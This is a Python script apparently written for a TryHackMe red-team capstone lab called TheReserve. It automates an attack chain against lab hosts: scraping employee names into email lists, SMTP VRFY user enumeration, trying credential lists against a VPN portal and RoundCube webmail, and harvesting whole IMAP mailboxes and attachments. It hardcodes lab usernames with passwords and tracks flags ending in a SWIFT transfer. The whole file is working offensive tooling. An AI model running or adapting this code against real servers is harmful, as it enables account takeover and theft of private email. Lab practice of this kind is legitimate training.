#!/usr/bin/env python3
"""
TheReserve Red Team — Python Automation Script
TryHackMe Capstone Challenge | WSL Build
All output → /mnt/c/Users/Lamona/Desktop/redteamcapston/automation/output
"""

import os, sys, socket, time, imaplib, email, json, threading
import subprocess, requests
from pathlib import Path
from datetime import datetime

# ── Paths ────────────────────────────────────────────────────
BASE    = Path("/mnt/c/Users/Lamona/Desktop/redteamcapston/automation")
OUTDIR  = BASE / "output"
OUTDIR.mkdir(parents=True, exist_ok=True)

# ── Targets ──────────────────────────────────────────────────
MAIL_IP     = "10.200.40.11"
VPN_PORTAL  = "10.200.40.12"
WEB_IP      = "10.200.40.13"
MAIL_HOST   = "mail.thereserve.loc"
SUBNET      = "10.200.40"

# ── Known creds (fallback if brute force not run) ────────────
KNOWN_CREDS = [
    ("keith.allen@corp.thereserve.loc",    "Password123!"),
    ("laura.wood@corp.thereserve.loc",     "Password1@"),
    ("lynda.gordon@corp.thereserve.loc",   "thereserve2023!"),
    ("mohammad.ahmed@corp.thereserve.loc", "Password1!"),
]

# ── Colors ───────────────────────────────────────────────────
G  = "\033[92m"; Y = "\033[93m"; R = "\033[91m"
C  = "\033[96m"; W = "\033[0m";  B = "\033[1m"

def log(m):  print(f"{G}[+]{W} {m}")
def warn(m): print(f"{Y}[!]{W} {m}")
def info(m): print(f"{C}[*]{W} {m}")
def err(m):  print(f"{R}[-]{W} {m}")
def save(path, data, mode="w"):
    with open(path, mode, encoding="utf-8", errors="ignore") as f:
        f.write(data)
    log(f"Saved → {path}")

def banner():
    os.system("clear")
    print(f"""{R}{B}
╔════════════════════════════════════════════════╗
║   TheReserve Red Team Automation — Python     ║
║   TryHackMe Capstone  |  WSL Build            ║
╚════════════════════════════════════════════════╝{W}
  Output → {C}{OUTDIR}{W}
""")

# ════════════════════════════════════════════════════════════
# MODULE 1 — Load Credentials
# ════════════════════════════════════════════════════════════
def load_creds():
    creds_file = OUTDIR / "creds_found.txt"
    creds = []
    if creds_file.exists():
        for line in creds_file.read_text().splitlines():
            line = line.strip()
            if ":" in line:
                u, p = line.split(":", 1)
                creds.append((u.strip(), p.strip()))
        if creds:
            log(f"Loaded {len(creds)} creds from {creds_file}")
            return creds
    warn("No creds file found — using known fallback creds")
    return KNOWN_CREDS

# ════════════════════════════════════════════════════════════
# MODULE 2 — IMAP Mailbox Harvester
# ════════════════════════════════════════════════════════════
def harvest_mailbox(username, password):
    short = username.split("@")[0]
    mail_dir = OUTDIR / f"mail_{short}"
    mail_dir.mkdir(exist_ok=True)
    summary_lines = []

    info(f"IMAP login: {username}")
    try:
        m = imaplib.IMAP4(MAIL_IP, 143)
        m.login(username, password)
        m.select("INBOX")
        _, msg_ids = m.search(None, "ALL")
        ids = msg_ids[0].split()
        log(f"{username}: {len(ids)} message(s)")

        for i, mid in enumerate(ids, 1):
            _, data = m.fetch(mid, "(RFC822)")
            raw = data[0][1]
            msg = email.message_from_bytes(raw)

            subject = msg.get("Subject", "no-subject")
            sender  = msg.get("From",    "unknown")
            date    = msg.get("Date",    "")
            body    = ""

            if msg.is_multipart():
                for part in msg.walk():
                    ct = part.get_content_type()
                    if ct == "text/plain":
                        body = part.get_payload(decode=True).decode(errors="ignore")
                        break
                    elif ct == "text/html" and not body:
                        body = part.get_payload(decode=True).decode(errors="ignore")
            else:
                body = msg.get_payload(decode=True).decode(errors="ignore")

            # Check for attachments
            attachments = []
            for part in msg.walk():
                if part.get_content_disposition() == "attachment":
                    fname = part.get_filename() or f"attachment_{i}"
                    att_path = mail_dir / fname
                    att_path.write_bytes(part.get_payload(decode=True))
                    attachments.append(str(fname))
                    log(f"  Attachment saved: {fname}")

            entry = {
                "id": mid.decode(),
                "from": sender,
                "subject": subject,
                "date": date,
                "body": body,
                "attachments": attachments,
            }
            summary_lines.append(entry)

            # Save each email as text
            out = f"From:    {sender}\nDate:    {date}\nSubject: {subject}\n"
            if attachments:
                out += f"Files:   {', '.join(attachments)}\n"
            out += f"\n{'─'*60}\n{body}"
            save(mail_dir / f"msg_{i:03d}.txt", out)

            print(f"  {C}[{i}]{W} {subject[:60]}")
            print(f"      From: {sender}")

        # Save JSON summary
        save(mail_dir / "_summary.json", json.dumps(summary_lines, indent=2))
        m.logout()
        return summary_lines

    except Exception as e:
        err(f"{username}: {e}")
        return []

def run_mailbox_harvest():
    print(f"\n{C}══ MODULE 2: Mailbox Harvest ══{W}")
    creds = load_creds()
    all_results = {}
    for user, pwd in creds:
        results = harvest_mailbox(user, pwd)
        all_results[user] = results

    # Write master report
    report = f"TheReserve Mailbox Harvest Report\n"
    report += f"Generated: {datetime.now()}\n{'═'*60}\n\n"
    for user, msgs in all_results.items():
        report += f"\n{'━'*60}\n INBOX: {user} ({len(msgs)} messages)\n{'━'*60}\n"
        for m in msgs:
            report += f"\n  Subject : {m.get('subject','')}\n"
            report += f"  From    : {m.get('from','')}\n"
            report += f"  Date    : {m.get('date','')}\n"
            if m.get("attachments"):
                report += f"  Files   : {', '.join(m['attachments'])}\n"
            body_preview = m.get("body","")[:300].replace('\n',' ')
            report += f"  Preview : {body_preview}...\n"

    save(OUTDIR / "mailbox_report.txt", report)
    log(f"Master report → {OUTDIR}/mailbox_report.txt")

# ════════════════════════════════════════════════════════════
# MODULE 3 — SMTP User Validation
# ════════════════════════════════════════════════════════════
def smtp_verify_user(email_addr):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((MAIL_IP, 25))
        s.recv(1024)
        s.send(b"EHLO test\r\n"); time.sleep(0.3); s.recv(1024)
        s.send(f"VRFY {email_addr}\r\n".encode()); time.sleep(0.3)
        resp = s.recv(1024).decode(errors="ignore")
        s.send(b"QUIT\r\n"); s.close()
        code = resp.strip()[:3]
        return code in ("250", "252"), resp.strip()
    except Exception as e:
        return False, str(e)

def run_smtp_enum():
    print(f"\n{C}══ MODULE 3: SMTP User Enumeration ══{W}")
    emails_file = OUTDIR / "emails.txt"
    if not emails_file.exists():
        warn("No emails.txt — run bash OSINT phase first")
        return
    emails = emails_file.read_text().splitlines()
    valid  = []
    for em in emails:
        em = em.strip()
        if not em: continue
        ok, resp = smtp_verify_user(em)
        if ok:
            log(f"VALID: {em}")
            valid.append(em)
        else:
            info(f"  Skip: {em}")

    save(OUTDIR / "valid_users.txt", "\n".join(valid) + "\n")
    log(f"Valid users → {OUTDIR}/valid_users.txt ({len(valid)} found)")

# ════════════════════════════════════════════════════════════
# MODULE 4 — VPN Portal Login
# ════════════════════════════════════════════════════════════
def vpn_portal_login(username, password):
    short = username.split("@")[0]
    try:
        sess = requests.Session()
        r = sess.get(
            f"http://{VPN_PORTAL}/login.php",
            params={"user": short, "password": password},
            timeout=8
        )
        if "Login Failed" not in r.text:
            log(f"VPN Portal SUCCESS: {short} / {password}")
            # Try to get upload page and vpn dir
            upload = sess.get(f"http://{VPN_PORTAL}/upload.php", timeout=5)
            vpn_dir = sess.get(f"http://{VPN_PORTAL}/vpn/", timeout=5)
            save(OUTDIR / f"vpn_upload_{short}.html", upload.text)
            save(OUTDIR / f"vpn_dir_{short}.html",    vpn_dir.text)
            return True, sess
        return False, None
    except Exception as e:
        err(f"VPN portal error ({short}): {e}")
        return False, None

def run_vpn_portal():
    print(f"\n{C}══ MODULE 4: VPN Portal Attack ══{W}")
    creds = load_creds()
    valid_logins = []
    for user, pwd in creds:
        ok, sess = vpn_portal_login(user, pwd)
        if ok:
            valid_logins.append(f"{user}:{pwd}")
    if valid_logins:
        save(OUTDIR / "vpn_portal_valid.txt", "\n".join(valid_logins) + "\n")
        log(f"Portal logins → {OUTDIR}/vpn_portal_valid.txt")
    else:
        warn("No VPN portal access with current credentials")

# ════════════════════════════════════════════════════════════
# MODULE 5 — Web Scraper / OSINT
# ════════════════════════════════════════════════════════════
def run_web_osint():
    print(f"\n{C}══ MODULE 5: Web OSINT ══{W}")
    pages = {
        "meet_the_team": f"http://{WEB_IP}/october/index.php/demo/meettheteam",
        "contact_us":    f"http://{WEB_IP}/october/index.php/demo/contactus",
        "overview":      f"http://{WEB_IP}/october/index.php",
        "webmail_root":  f"http://{MAIL_HOST}/",
        "webmail_login": f"http://{MAIL_HOST}/index.php",
        "vpn_portal":    f"http://{VPN_PORTAL}/",
        "vpn_dir":       f"http://{VPN_PORTAL}/vpn/",
    }
    employees = set()
    emails    = set()

    for name, url in pages.items():
        try:
            r = requests.get(url, timeout=8,
                             headers={"Host": url.split("/")[2]})
            save(OUTDIR / f"page_{name}.html", r.text)
            info(f"Scraped: {url} [{r.status_code}]")

            # Extract emails
            import re
            found_emails = re.findall(r'[\w.\-]+@[\w.\-]+\.loc', r.text)
            for fe in found_emails:
                emails.add(fe)

            # Extract employee names from img filenames
            img_names = re.findall(r'([a-z]+\.[a-z]+)\.jpeg', r.text)
            for n in img_names:
                employees.add(n)
                emails.add(f"{n}@corp.thereserve.loc")

        except Exception as e:
            warn(f"Failed {url}: {e}")

    # Save employees
    if employees:
        save(OUTDIR / "employee_names.txt", "\n".join(sorted(employees)) + "\n")
        log(f"Employees → {OUTDIR}/employee_names.txt ({len(employees)})")

    # Save emails
    if emails:
        save(OUTDIR / "emails.txt", "\n".join(sorted(emails)) + "\n")
        log(f"Emails    → {OUTDIR}/emails.txt ({len(emails)})")

    # Save usernames (no domain)
    if emails:
        short_users = [e.split("@")[0] for e in sorted(emails)]
        save(OUTDIR / "usernames_short.txt", "\n".join(short_users) + "\n")

# ════════════════════════════════════════════════════════════
# MODULE 6 — Network Connectivity Check
# ════════════════════════════════════════════════════════════
def check_port(host, port, timeout=3):
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except:
        return False

def run_connectivity_check():
    print(f"\n{C}══ MODULE 6: Connectivity Check ══{W}")
    targets = {
        "MAIL SSH":      (MAIL_IP,    22),
        "MAIL SMTP":     (MAIL_IP,    25),
        "MAIL IMAP":     (MAIL_IP,   143),
        "MAIL POP3":     (MAIL_IP,   110),
        "MAIL RDP":      (MAIL_IP,  3389),
        "MAIL WinRM":    (MAIL_IP,  5985),
        "MAIL HTTP":     (MAIL_IP,    80),
        "VPN Portal":    (VPN_PORTAL, 80),
        "VPN OpenVPN":   (VPN_PORTAL,1194),
        "Web HTTP":      (WEB_IP,     80),
    }
    report_lines = [f"Connectivity Check — {datetime.now()}\n{'─'*40}"]
    for name, (host, port) in targets.items():
        ok = check_port(host, port)
        status = f"{G}OPEN{W}" if ok else f"{R}CLOSED{W}"
        sym = "✓" if ok else "✗"
        print(f"  [{sym}] {name:20s} {host}:{port}")
        report_lines.append(f"  [{sym}] {name}: {host}:{port} → {'OPEN' if ok else 'CLOSED'}")
    save(OUTDIR / "connectivity.txt", "\n".join(report_lines) + "\n")

# ════════════════════════════════════════════════════════════
# MODULE 7 — RoundCube Webmail Login
# ════════════════════════════════════════════════════════════
def roundcube_login(username, password):
    short = username.split("@")[0]
    sess  = requests.Session()
    try:
        # Step 1: GET login page for CSRF token
        r = sess.get(f"http://{MAIL_HOST}/index.php", timeout=8)
        import re
        token = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
        if not token:
            warn(f"No CSRF token found for {short}")
            return False, None
        tok = token.group(1)

        # Step 2: POST login
        data = {
            "_token":   tok,
            "_task":    "login",
            "_action":  "login",
            "_timezone":"UTC",
            "_url":     "",
            "_user":    username,
            "_pass":    password,
        }
        r2 = sess.post(f"http://{MAIL_HOST}/index.php",
                       data=data, timeout=8,
                       allow_redirects=True)

        if "rcmloginuser" not in r2.text and r2.status_code == 200:
            log(f"RoundCube login SUCCESS: {short}")
            save(OUTDIR / f"roundcube_{short}_inbox.html", r2.text)
            return True, sess
        return False, None
    except Exception as e:
        err(f"RoundCube login error ({short}): {e}")
        return False, None

def run_roundcube():
    print(f"\n{C}══ MODULE 7: RoundCube Webmail ══{W}")
    creds = load_creds()
    for user, pwd in creds:
        ok, sess = roundcube_login(user, pwd)
        if ok:
            short = user.split("@")[0]
            log(f"Logged in as {short} via RoundCube")

# ════════════════════════════════════════════════════════════
# MODULE 8 — Full Engagement Report
# ════════════════════════════════════════════════════════════
def generate_report():
    print(f"\n{C}══ MODULE 8: Engagement Report ══{W}")
    report = []
    report.append("=" * 60)
    report.append("  TheReserve Red Team Engagement Report")
    report.append(f"  Generated: {datetime.now()}")
    report.append("=" * 60)

    # Hosts
    hosts_file = OUTDIR / "hosts_up.txt"
    if hosts_file.exists():
        report.append("\n[HOSTS]\n" + hosts_file.read_text())

    # Emails
    emails_file = OUTDIR / "emails.txt"
    if emails_file.exists():
        lines = emails_file.read_text().splitlines()
        report.append(f"\n[EMPLOYEES — {len(lines)} found]")
        report.extend([f"  {l}" for l in lines])

    # Creds
    creds_file = OUTDIR / "creds_found.txt"
    if creds_file.exists():
        report.append("\n[CREDENTIALS FOUND]")
        for line in creds_file.read_text().splitlines():
            report.append(f"  {line}")
    else:
        report.append("\n[CREDENTIALS — known fallback]")
        for u, p in KNOWN_CREDS:
            report.append(f"  {u} : {p}")

    # SSH
    ssh_file = OUTDIR / "ssh_valid.txt"
    if ssh_file.exists() and ssh_file.stat().st_size > 0:
        report.append("\n[SSH ACCESS]")
        report.extend([f"  {l}" for l in ssh_file.read_text().splitlines()])

    # Mail harvest
    mail_dirs = list(OUTDIR.glob("mail_*/"))
    if mail_dirs:
        report.append(f"\n[MAIL HARVEST — {len(mail_dirs)} inbox(es)]")
        for md in mail_dirs:
            msgs = list(md.glob("msg_*.txt"))
            report.append(f"  {md.name}: {len(msgs)} email(s)")

    # Flags tracker
    report.append("\n[FLAG TRACKER]")
    flags = {
        1:  "Perimeter Breach",        2:  "AD Breach",
        3:  "CORP Tier2 Foothold",     4:  "CORP Tier2 Admin",
        5:  "CORP Tier1 Foothold",     6:  "CORP Tier1 Admin",
        7:  "CORP Tier0 Foothold",     8:  "CORP Tier0 Admin",
        9:  "BANK Tier2 Foothold",     10: "BANK Tier2 Admin",
        11: "BANK Tier1 Foothold",     12: "BANK Tier1 Admin",
        13: "BANK Tier0 Foothold",     14: "BANK Tier0 Admin",
        15: "Parent Domain Foothold",  16: "Parent Domain Admin",
        17: "SWIFT Access",            18: "SWIFT Capturer",
        19: "SWIFT Approver",          20: "Transfer Made",
    }
    flags_file = OUTDIR / "flags_captured.txt"
    captured = {}
    if flags_file.exists():
        for line in flags_file.read_text().splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                captured[int(k.strip())] = v.strip()
    for num, name in flags.items():
        status = f"✓ {captured[num]}" if num in captured else "○ pending"
        report.append(f"  Flag {num:2d}: {name:30s} {status}")

    full = "\n".join(report)
    save(OUTDIR / "engagement_report.txt", full)
    print(full)

# ════════════════════════════════════════════════════════════
# MODULE 9 — Flag Logger
# ════════════════════════════════════════════════════════════
def log_flag():
    print(f"\n{C}══ MODULE 9: Log Captured Flag ══{W}")
    flags = {
        1:"Perimeter Breach",     2:"AD Breach",
        3:"CORP Tier2 Foothold",  4:"CORP Tier2 Admin",
        5:"CORP Tier1 Foothold",  6:"CORP Tier1 Admin",
        7:"CORP Tier0 Foothold",  8:"CORP Tier0 Admin",
        9:"BANK Tier2 Foothold",  10:"BANK Tier2 Admin",
        11:"BANK Tier1 Foothold", 12:"BANK Tier1 Admin",
        13:"BANK Tier0 Foothold", 14:"BANK Tier0 Admin",
        15:"Parent Foothold",     16:"Parent Admin",
        17:"SWIFT Access",        18:"SWIFT Capturer",
        19:"SWIFT Approver",      20:"Transfer Made",
    }
    try:
        n = int(input("  Flag number (1-20): ").strip())
        v = input(f"  Flag value for '{flags.get(n,'?')}': ").strip()
        flags_file = OUTDIR / "flags_captured.txt"
        existing = {}
        if flags_file.exists():
            for line in flags_file.read_text().splitlines():
                if ":" in line:
                    k, val = line.split(":", 1)
                    existing[int(k.strip())] = val.strip()
        existing[n] = v
        content = "\n".join(f"{k}: {val}" for k, val in sorted(existing.items()))
        save(flags_file, content + "\n")
        log(f"Flag {n} logged: {v}")
    except (ValueError, KeyboardInterrupt):
        warn("Cancelled")

# ════════════════════════════════════════════════════════════
# MAIN MENU
# ════════════════════════════════════════════════════════════
def main():
    banner()
    menu = {
        "1": ("Connectivity check",          run_connectivity_check),
        "2": ("Web OSINT / employee harvest", run_web_osint),
        "3": ("SMTP user enumeration",        run_smtp_enum),
        "4": ("Mailbox harvest (IMAP)",       run_mailbox_harvest),
        "5": ("VPN portal attack",            run_vpn_portal),
        "6": ("RoundCube webmail login",      run_roundcube),
        "7": ("Generate engagement report",   generate_report),
        "8": ("Log a captured flag",          log_flag),
        "9": ("Run ALL modules",              None),
        "0": ("Exit",                         None),
    }
    for k, (desc, _) in menu.items():
        print(f"  [{k}] {desc}")

    print()
    choice = input("Choice: ").strip()

    if choice == "0":
        print("Bye!"); sys.exit(0)
    elif choice == "9":
        for k, (_, fn) in menu.items():
            if fn and k not in ("7", "8"):
                fn()
        generate_report()
    elif choice in menu:
        _, fn = menu[choice]
        if fn: fn()
    else:
        err("Invalid choice")
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted{W}")
        sys.exit(0)
